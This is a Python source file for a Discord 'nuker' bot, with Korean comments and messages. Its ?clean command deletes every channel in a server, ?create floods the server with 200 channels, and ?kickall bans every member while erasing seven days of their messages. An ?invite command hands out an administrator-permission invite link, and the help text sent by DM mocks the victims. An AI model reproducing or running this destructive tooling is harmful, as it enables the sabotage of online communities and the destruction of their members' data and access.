#머리

import discord, asyncio
from discord.ext import commands
import os

client = commands.Bot(command_prefix = '?')

@client.event
async def on_ready():

  # [discord.Status.online = 온라인],[discord.Status.idle = 자리비움],[discord.Status.dnd = 다른용무],[discord.Status.offline = 오프라인]
  await client.change_presence(status=discord.Status.online)

  await client.change_presence(activity=discord.Game(name="튀엣"))
  #await client.change_presence(activity=discord.Streaming(name="스트림 방송중", url='링크'))
  #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="노래 듣는중"))
  #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="영상 시청중"))
  
  print("Aigis:",client.user.name,"819929289759653928:",client.user.id,"3:",discord.__version__)

@client.command()
async def clean(ctx):
    guild = ctx.guild
    for channel in guild.channels:
        await channel.delete()
    await ctx.guild.create_text_channel("ㅋ")
    await ctx.send("ㅋ")
        
@client.command()
async def invite(ctx):
    await ctx.send("튀엣 \n https://discord.com/api/oauth2/authorize?client_id=819929289759653928&permissions=8&scope=bot")

@client.command()
async def create(ctx):
     for i in range(200):
        await ctx.guild.create_text_channel("튀엣")
        
@client.command()

async def kick(ctx, member: discord.Member, *, reason=None):

    await member.kick(reason=reason)

    await ctx.send(f'튀엣 {member} X')
    
@client.command()
async def kickall(ctx):
    for user in ctx.guild.members:
        try:
            await user.ban(reason="헤으응", delete_message_days=7)
            await ctx.send(f"후힛")
        except:
            pass
    
@client.command()
async def cmd(ctx):
  await ctx.message.delete()
  author = ctx.author
  cmd = discord.Embed(
    title = "커맨드 튀에에에에에에에에에에에에에엣", 
    description = """
**느그가 쓰는것**
```
?cmd
튀엣  
 
?create
튀엣 생성

?clean
튀엣 제거

?kick @유저
튀엣 추방

?kickall
튀엣 싸그리몽땅

?invite
튀엣 초대
```
**제작자 한마디**
```
오류개짜증
```
""")
  await author.send(embed = cmd)
  

    
client.run(os.environ['token'])
